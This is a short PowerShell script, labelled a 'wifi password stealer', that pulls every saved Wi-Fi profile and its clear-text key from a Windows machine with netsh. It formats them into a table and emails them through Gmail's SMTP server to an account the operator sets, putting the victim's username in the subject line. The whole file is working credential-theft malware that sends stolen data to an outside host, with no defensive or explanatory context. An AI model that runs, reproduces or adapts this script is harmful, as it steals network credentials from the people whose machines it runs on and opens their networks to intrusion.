# smtp based wifi password stealer
# created by : C0SM0

# change to your gmail credentials
$email = "example@gmail.com"
$password = "password"

# exfiltrate wifi creds to file
# file named after username
$creds = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String

# email creds via smtp
$subject = "$env:UserName wifi passwords"
$smtp = New-Object System.Net.Mail.SmtpClient("smtp.gmail.com", "587");
$smtp.EnableSSL = $true
$smtp.Credentials = New-Object System.Net.NetworkCredential($email, $password);
$smtp.Send($email, $email, $subject, $creds);
